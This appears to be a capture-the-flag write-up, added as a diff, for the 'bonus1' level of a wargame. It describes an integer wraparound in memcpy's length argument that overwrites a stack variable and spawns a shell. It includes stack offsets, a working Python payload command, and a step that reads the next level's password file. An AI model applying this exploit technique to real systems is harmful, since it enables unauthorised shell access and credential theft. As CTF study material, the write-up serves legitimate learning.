@@ -1,0 +1,32 @@
+Goal: overwrite the local `length` variable to trigger the `execl("/bin/sh")` branch.
+
+Observation:
+- `length` is checked with `if (length > 9) return 1;`.
+- Then `memcpy(buffer, argv[2], (size_t)length * 4)` is called.
+- `buffer` is 40 bytes, and `length` lives 40 bytes above it on the stack.
+- If we copy 44 bytes, we overwrite `length` with a chosen value.
+
+Stack offsets (from disassembly):
+- `buffer` at `esp+0x14`
+- `length` at `esp+0x3c`
+- Distance = 0x3c - 0x14 = 0x28 = 40 bytes
+
+We need `length * 4 == 44` (mod 2^32), but `length` must be negative to pass the `> 9` check.
+Choose:
+- `length = -1073741813` (0xC000000B)
+- `length * 4 = 0x0000002C = 44`
+
+Exploit steps:
+1) Build payload: 40 bytes of padding + 0x574f4c46
+2) Run with the crafted negative length:
+	/home/user/bonus1/bonus1 -1073741813 "$(python2 - <<'PY'
+	import struct
+	payload = "A"*40 + struct.pack("<I", 0x574f4c46)
+	print payload
+	PY
+	)"
+3) The check `if (length == 0x574f4c46)` passes and `execl("/bin/sh")` is executed.
+4) In the spawned shell:
+	cat /home/user/bonus2/.pass
+
+
